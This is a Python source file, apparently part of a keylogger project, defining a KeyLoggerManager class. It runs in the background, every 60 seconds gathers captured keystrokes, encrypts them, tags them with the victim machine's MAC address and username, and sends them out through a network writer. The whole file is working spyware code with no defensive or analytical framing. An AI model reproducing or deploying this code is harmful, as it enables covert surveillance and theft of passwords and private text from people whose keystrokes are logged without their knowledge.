from writer import NetworkWriter
import time
from getmac import get_mac_address as gma
from encryption import ShaulEncryption as Encryption
from key_logger_service.key_Logger_service import KeyLoggerService
import threading
import os
# import pwd
import getpass



class KeyLoggerManager:

    def __init__(self):
        self.key_logger_service = KeyLoggerService()
        self.id = gma()

    def __get_formatted_time(self) -> time.strftime:
        epoch_time = time.time()
        return time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(epoch_time))

    def __encrypt(self, keys_data: dict) -> dict:
        for value in keys_data.values():
            for i in range(len(value)):
                enc_value = Encryption().encrypt(value[i])
                value[i] = enc_value

        return keys_data

    def __write(self, data_to_write: dict) -> bool:

        try:
            w = NetworkWriter()
            w.write(data=data_to_write)
            return True
        except Exception as e:
            print("Error in __write function", str(e))

    def __get_and_add_data_to_file(self):
        encrypted_kd = self.__encrypt(self.key_logger_service.get)
        date_time = self.__get_formatted_time()
        data_for_file = {
            "time": str(date_time),
            "data": encrypted_kd,
            "mac_address": str(self.id),
            # "nickname": str(pwd.getpwuid(os.geteuid()).pw_name)
            "nickname": str(getpass.getuser())

        }

        self.__write(data_to_write=data_for_file)          

    def start_get_data_counter(self):
        t = threading.Timer(60.0, self.start_get_data_counter)
        t.daemon = True
        t.start()
        
        self.__get_and_add_data_to_file()

    def run(self):
        '''
        Runs the program in the background
        '''
        if self.key_logger_service.start: # Try running the service, if it does start counter for getting the data every few minutes
            self.start_get_data_counter()

        # Stop the service and returns the data
    def stop(self):
        self.key_logger_service.stop
        self.__get_and_add_data_to_file()




